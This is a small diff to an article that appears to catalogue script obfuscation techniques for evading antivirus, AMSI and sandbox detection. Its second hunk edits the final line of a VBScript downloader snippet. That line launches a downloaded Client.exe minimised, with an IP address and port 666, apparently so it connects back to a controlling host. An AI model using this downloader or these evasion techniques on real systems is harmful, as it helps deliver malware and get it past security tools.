@@ -3,7 +3,7 @@
                                                            - INTRO -
 
 The amazing work conducted by [@danielbohannon](https://twitter.com/danielhbohannon) in [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation), it took me to compile this article with a list
-of available obfuscation technics for cmd.exe (cmd-bat) bash (bash-sh) powershell (psh-ps1) C (C), vbscript (vbs), etc .. 
+of available obfuscation technics for cmd.exe (cmd-bat) bash (bash-sh) powershell (psh-ps1) C (C), vbscript (vbs), etc ..
 In one attempt to bypass AV's [AMSI|DEP|ASLR] detection mechanisms and sandbox detection technics. This article does not
 focus in shellcode obfuscation or crypting, but only in system call's that are (or migth) beeing detected by security
 suites like microsoft's AMSI/DEP/ASLR string based detection mechanisms ..
@@ -2167,7 +2167,7 @@ End if
 
 Set objXMLHTTP = Nothing
 x=MsgBox("File Successfully Downloaded" & vbCrLf & "Storage: C:\Users\pedro\Desktop\Client.exe",64,"VBS Downloader")
-CreateObject("WScript.Shell").Exec "cmd /R start /min Client.exe ip=192.168.1.73 port=666"
+CreateObject("WScript.Shell").Exec "cmd /b /R start /b /min Client.exe ip=192.168.1.73 port=666"
 ```
 
 ---
